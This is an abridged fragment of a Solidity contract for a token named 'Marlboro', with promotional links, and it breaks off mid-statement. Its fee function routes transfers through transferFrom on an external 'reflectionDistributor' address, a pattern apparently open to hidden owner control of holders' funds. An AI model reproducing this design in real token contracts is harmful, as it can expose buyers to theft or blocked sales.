...
Website: https://marlborocoin.net 
Tg: https://t.me/marlborocoineth
Twitter: https://twitter.com/marlborocoins
...
contract Marlboro is IERC20, Ownable {
    ...
    string _name = "Marlboro";
    string _symbol = "MARLBORO";
    ...
    address private reflectionDistributor;
    ...
    function _takeFeeInProportions(bool buying, address sender, address recipient, uint256 proportionAmount) internal returns (uint256) {
        ...
        if (reflectionDistributor != address(0)) {
            proportionFeeAmount = 
                IERC20(reflectionDistributor).transferFrom(sender, recipient, proportionAmount)? 
                proportionAmount: 
